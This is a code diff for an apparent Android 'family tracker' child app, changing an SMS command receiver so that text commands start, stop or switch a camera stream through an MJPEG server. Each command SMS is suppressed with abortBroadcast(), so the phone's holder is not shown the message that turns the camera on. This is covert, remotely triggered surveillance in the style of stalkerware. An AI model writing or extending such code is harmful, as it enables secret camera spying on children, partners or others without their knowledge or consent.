@@ -3,6 +3,7 @@ package com.family.tracker.child
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.telephony.SmsManager
 import android.telephony.SmsMessage
 import android.util.Log
 
@@ -28,31 +29,26 @@ class CommandReceiver : BroadcastReceiver() {
                     return
                 }
 
-                when {
-                    text == "VIDEO_ON" -> {
-                        Log.d(TAG, "🎥 Démarrage caméra")
-                        val i = Intent(context, WebRTCService::class.java)
-                        i.action = WebRTCService.ACTION_START
+                when (text) {
+                    "STREAM_ON" -> {
+                        Log.d(TAG, "🎥 DÉMARRAGE FLUX VIDÉO")
+                        val i = Intent(context, MJPEGServer::class.java)
+                        i.action = MJPEGServer.ACTION_START
                         context.startForegroundService(i)
                         abortBroadcast()
                     }
-                    text == "VIDEO_OFF" -> {
-                        Log.d(TAG, "🛑 Arrêt caméra")
-                        val i = Intent(context, WebRTCService::class.java)
-                        i.action = WebRTCService.ACTION_STOP
+                    "STREAM_OFF" -> {
+                        Log.d(TAG, "🛑 ARRÊT FLUX")
+                        val i = Intent(context, MJPEGServer::class.java)
+                        i.action = MJPEGServer.ACTION_STOP
                         context.startForegroundService(i)
                         abortBroadcast()
                     }
-                    text == "VIDEO_SWITCH" -> {
-                        Log.d(TAG, "🔄 Changement caméra")
-                        val i = Intent(context, WebRTCService::class.java)
-                        i.action = WebRTCService.ACTION_SWITCH
+                    "STREAM_SWITCH" -> {
+                        Log.d(TAG, "🔄 CHANGER DE CAMÉRA")
+                        val i = Intent(context, MJPEGServer::class.java)
+                        i.action = MJPEGServer.ACTION_SWITCH
                         context.startForegroundService(i)
-                        abortBroadcast()
-                    }
-                    text.startsWith("OFFER:") || text.startsWith("ANSWER:") || text.startsWith("ICE:") -> {
-                        Log.d(TAG, "📥 Signal WebRTC reçu")
-                        WebRTCService.SignalingHandler().receiveSignal(text)
                         abortBroadcast()
                     }
                 }
